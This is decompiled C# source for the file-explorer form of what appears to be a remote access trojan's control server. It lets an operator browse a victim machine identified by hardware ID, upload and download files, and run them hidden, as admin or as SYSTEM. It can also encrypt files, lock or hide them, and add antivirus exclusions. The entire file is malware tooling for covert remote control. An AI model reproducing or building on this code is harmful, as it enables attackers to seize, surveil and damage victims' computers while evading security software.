using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000AA RID: 170
	public partial class FormExplorer : FormMaterial
	{
		// Token: 0x0600051D RID: 1309 RVA: 0x00047D46 File Offset: 0x00045F46
		public FormExplorer()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x0600051E RID: 1310 RVA: 0x00047D68 File Offset: 0x00045F68
		private void FormExplorer_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			this.rjTextBox1.textBox1.ReadOnly = true;
			this.dataGridView1.DoubleClick += this.dataGridView1_DoubleClick;
			this.dataGridView2.DoubleClick += this.dataGridView2_DoubleClick;
			this.dataGridView3.DoubleClick += this.dataGridView3_DoubleClick;
			this.dataGridView2.DragEnter += this.dataGridView2_DragEnter;
			this.dataGridView2.DragDrop += this.dataGridView2_DragDrop;
			this.dataGridView2.DragOver += this.dataGridView2_DragOver;
			typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, this.dataGridView1, new object[]
			{
				true
			});
			typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, this.dataGridView2, new object[]
			{
				true
			});
			typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, this.dataGridView3, new object[]
			{
				true
			});
		}

		// Token: 0x0600051F RID: 1311 RVA: 0x00047EC8 File Offset: 0x000460C8
		private void ChangeScheme(object sender)
		{
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
			this.dataGridView1.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.dataGridView1.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView1.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.dataGridView1.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView3.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.dataGridView3.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView3.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.dataGridView3.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x06000520 RID: 1312 RVA: 0x00047FE1 File Offset: 0x000461E1
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x06000521 RID: 1313 RVA: 0x00047FF8 File Offset: 0x000461F8
		private void dataGridView3_DoubleClick(object sender, EventArgs e)
		{
			if (this.dataGridView3.SelectedRows.Count == 0)
			{
				return;
			}
			this.dataGridView1.Enabled = false;
			this.dataGridView3.Enabled = false;
			this.dataGridView2.Enabled = false;
			this.materialLabel1.Text = "Please wait";
			this.client.Send(LEB128.Write(new object[]
			{
				"GetVariblePath",
				(string)this.dataGridView3.SelectedRows[0].Cells[1].Value
			}));
		}

		// Token: 0x06000522 RID: 1314 RVA: 0x00048094 File Offset: 0x00046294
		private void dataGridView1_DoubleClick(object sender, EventArgs e)
		{
			if (this.dataGridView1.SelectedRows.Count == 0)
			{
				return;
			}
			this.dataGridView1.Enabled = false;
			this.dataGridView3.Enabled = false;
			this.dataGridView2.Enabled = false;
			this.materialLabel1.Text = "Please wait";
			this.client.Send(LEB128.Write(new object[]
			{
				"GetPath",
				(string)this.dataGridView1.SelectedRows[0].Cells[1].Value
			}));
		}

		// Token: 0x06000523 RID: 1315 RVA: 0x00048130 File Offset: 0x00046330
		private void dataGridView2_DoubleClick(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			if (string.IsNullOrEmpty(this.rjTextBox1.Texts))
			{
				return;
			}
			if ((byte)this.dataGridView2.SelectedRows[0].Cells[0].Tag == 0 && this.rjTextBox1.Texts.Length > 3)
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Execute",
					Path.Combine(this.rjTextBox1.Texts, (string)this.dataGridView2.SelectedRows[0].Cells[1].Value)
				}));
			}
			if ((byte)this.dataGridView2.SelectedRows[0].Cells[0].Tag == 1)
			{
				this.dataGridView1.Enabled = false;
				this.dataGridView3.Enabled = false;
				this.dataGridView2.Enabled = false;
				this.materialLabel1.Text = "Please wait";
				this.client.Send(LEB128.Write(new object[]
				{
					"GetPath",
					Path.Combine(this.rjTextBox1.Texts, (string)this.dataGridView2.SelectedRows[0].Cells[1].Value)
				}));
			}
			if ((byte)this.dataGridView2.SelectedRows[0].Cells[0].Tag == 2 && this.rjTextBox1.Texts.Length > 3)
			{
				string text = this.rjTextBox1.Texts.Remove(this.rjTextBox1.Texts.LastIndexOfAny(new char[]
				{
					'\\'
				}, this.rjTextBox1.Texts.LastIndexOf('\\')));
				if (!text.Contains("\\"))
				{
					text += "\\";
				}
				this.dataGridView1.Enabled = false;
				this.dataGridView3.Enabled = false;
				this.dataGridView2.Enabled = false;
				this.materialLabel1.Text = "Please wait";
				this.client.Send(LEB128.Write(new object[]
				{
					"GetPath",
					text
				}));
			}
		}

		// Token: 0x06000524 RID: 1316 RVA: 0x0004839C File Offset: 0x0004659C
		private void backToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			string text = this.rjTextBox1.Texts.Remove(this.rjTextBox1.Texts.LastIndexOfAny(new char[]
			{
				'\\'
			}, this.rjTextBox1.Texts.LastIndexOf('\\')));
			if (!text.Contains("\\"))
			{
				text += "\\";
			}
			this.dataGridView1.Enabled = false;
			this.dataGridView3.Enabled = false;
			this.dataGridView2.Enabled = false;
			this.materialLabel1.Text = "Please wait";
			this.client.Send(LEB128.Write(new object[]
			{
				"GetPath",
				text
			}));
		}

		// Token: 0x06000525 RID: 1317 RVA: 0x0004846C File Offset: 0x0004666C
		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			this.dataGridView1.Enabled = false;
			this.dataGridView3.Enabled = false;
			this.dataGridView2.Enabled = false;
			this.materialLabel1.Text = "Please wait";
			this.client.Send(LEB128.Write(new object[]
			{
				"GetPath",
				this.rjTextBox1.Texts
			}));
		}

		// Token: 0x06000526 RID: 1318 RVA: 0x000484F0 File Offset: 0x000466F0
		private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Multiselect = true;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					foreach (string text in openFileDialog.FileNames)
					{
						FormUpload formUpload = new FormUpload();
						formUpload.path = text;
						formUpload.pathto = Path.Combine(this.rjTextBox1.Texts, new FileInfo(text).Name);
						formUpload.Name = "FormUpload:" + this.client.Hwid + "." + formUpload.pathto;
						formUpload.Text = "Upload: " + this.client.Hwid;
						formUpload.parrent = this.client;
						formUpload.Show();
						this.client.Send(LEB128.Write(new object[]
						{
							"UploadConnect",
							formUpload.Name
						}));
					}
				}
			}
		}

		// Token: 0x06000527 RID: 1319 RVA: 0x00048618 File Offset: 0x00046818
		private void dataGridView2_DragDrop(object sender, DragEventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			foreach (string text in (string[])e.Data.GetData(DataFormats.FileDrop))
			{
				FormUpload formUpload = new FormUpload();
				formUpload.path = text;
				formUpload.pathto = Path.Combine(this.rjTextBox1.Texts, new FileInfo(text).Name);
				formUpload.Name = "FormUpload:" + this.client.Hwid + "." + formUpload.pathto;
				formUpload.Text = "Upload: " + this.client.Hwid;
				formUpload.parrent = this.client;
				formUpload.Show();
				this.client.Send(LEB128.Write(new object[]
				{
					"UploadConnect",
					formUpload.Name
				}));
			}
		}

		// Token: 0x06000528 RID: 1320 RVA: 0x0004870F File Offset: 0x0004690F
		private void dataGridView2_DragEnter(object sender, DragEventArgs e)
		{
			if (e.Data.GetDataPresent(DataFormats.FileDrop))
			{
				e.Effect = DragDropEffects.Copy;
				return;
			}
			e.Effect = DragDropEffects.None;
		}

		// Token: 0x06000529 RID: 1321 RVA: 0x00048732 File Offset: 0x00046932
		private void dataGridView2_DragOver(object sender, DragEventArgs e)
		{
			e.Effect = DragDropEffects.Copy;
		}

		// Token: 0x0600052A RID: 1322 RVA: 0x0004873B File Offset: 0x0004693B
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x0600052B RID: 1323 RVA: 0x0004876C File Offset: 0x0004696C
		private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows[0].Index == 0)
			{
				return;
			}
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				this.client.Send(LEB128.Write(new object[]
				{
					"DownloadConnect",
					Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value)
				}));
			}
		}

		// Token: 0x0600052C RID: 1324 RVA: 0x0004884C File Offset: 0x00046A4C
		private void renameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows[0].Index == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Rename";
			formInput.rjTextBox1.PlaceholderText = "New name";
			formInput.rjTextBox1.Texts = (string)this.dataGridView2.SelectedRows[0].Cells[1].Value;
			formInput.ShowDialog();
			if (formInput.Run && formInput.rjTextBox1.Texts != (string)this.dataGridView2.SelectedRows[0].Cells[1].Value)
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Rename",
					this.rjTextBox1.Texts,
					(string)this.dataGridView2.SelectedRows[0].Cells[1].Value,
					formInput.rjTextBox1.Texts
				}));
			}
		}

		// Token: 0x0600052D RID: 1325 RVA: 0x00048998 File Offset: 0x00046B98
		private void removeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Remove",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x0600052E RID: 1326 RVA: 0x00048A84 File Offset: 0x00046C84
		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Copy",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x0600052F RID: 1327 RVA: 0x00048B70 File Offset: 0x00046D70
		private void cutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Cut",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000530 RID: 1328 RVA: 0x00048C5C File Offset: 0x00046E5C
		private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Paste",
				this.rjTextBox1.Texts
			}));
		}

		// Token: 0x06000531 RID: 1329 RVA: 0x00048CAC File Offset: 0x00046EAC
		private void createFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Create File";
			formInput.rjTextBox1.PlaceholderText = "File name";
			formInput.ShowDialog();
			if (formInput.Run && !string.IsNullOrEmpty(formInput.rjTextBox1.Texts))
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"CreateFile",
					Path.Combine(this.rjTextBox1.Texts, formInput.rjTextBox1.Texts)
				}));
			}
		}

		// Token: 0x06000532 RID: 1330 RVA: 0x00048D4C File Offset: 0x00046F4C
		private void createFolderToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Create Folder";
			formInput.rjTextBox1.PlaceholderText = "Folder name";
			formInput.ShowDialog();
			if (formInput.Run && !string.IsNullOrEmpty(formInput.rjTextBox1.Texts))
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"CreateFolder",
					Path.Combine(this.rjTextBox1.Texts, formInput.rjTextBox1.Texts)
				}));
			}
		}

		// Token: 0x06000533 RID: 1331 RVA: 0x00048DEC File Offset: 0x00046FEC
		private void excuteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Execute",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000534 RID: 1332 RVA: 0x00048ED8 File Offset: 0x000470D8
		private void executeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"ExecuteHidden",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000535 RID: 1333 RVA: 0x00048FC4 File Offset: 0x000471C4
		private void executeToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"ExecuteAdmin",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000536 RID: 1334 RVA: 0x000490B0 File Offset: 0x000472B0
		private void executeToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"ExecuteSystem",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000537 RID: 1335 RVA: 0x0004919C File Offset: 0x0004739C
		private void unzipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"UnZip",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000538 RID: 1336 RVA: 0x00049288 File Offset: 0x00047488
		private void zipToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Zip",
				this.rjTextBox1.Texts,
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000539 RID: 1337 RVA: 0x00049380 File Offset: 0x00047580
		private void hiddenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Attribute",
				"Hidden",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x0600053A RID: 1338 RVA: 0x00049474 File Offset: 0x00047674
		private void systemToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Attribute",
				"System",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x0600053B RID: 1339 RVA: 0x00049568 File Offset: 0x00047768
		private void normalToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Attribute",
				"Normal",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x0600053C RID: 1340 RVA: 0x0004965C File Offset: 0x0004785C
		private void directoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Attribute",
				"Directory",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x0600053D RID: 1341 RVA: 0x00049750 File Offset: 0x00047950
		private void lockRemoveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Attribute",
				"Lock",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x0600053E RID: 1342 RVA: 0x00049844 File Offset: 0x00047A44
		private void unlockRemoveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Attribute",
				"Unlock",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x0600053F RID: 1343 RVA: 0x00049938 File Offset: 0x00047B38
		private void encryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Encrypt",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000540 RID: 1344 RVA: 0x00049A24 File Offset: 0x00047C24
		private void decryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Decrypt",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000541 RID: 1345 RVA: 0x00049B10 File Offset: 0x00047D10
		private void execlitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"AddExclusion",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000542 RID: 1346 RVA: 0x00049BF4 File Offset: 0x00047DF4
		private void removeExclusionToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"RemoveExclusion",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000543 RID: 1347 RVA: 0x00049CD8 File Offset: 0x00047ED8
		private void audioToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Index != 0)
				{
					list.Add(Path.Combine(this.rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
				}
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Audio",
				string.Join(";", list.ToArray())
			}));
		}

		// Token: 0x06000544 RID: 1348 RVA: 0x00049DC4 File Offset: 0x00047FC4
		private void wallpaperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.rjTextBox1.Texts.Length < 3)
			{
				return;
			}
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Wallpaper",
				Path.Combine(this.rjTextBox1.Texts, (string)this.dataGridView2.SelectedRows[0].Cells[1].Value)
			}));
		}

		// Token: 0x040003BA RID: 954
		public Clients client;

		// Token: 0x040003BB RID: 955
		public Clients parrent;
	}
}
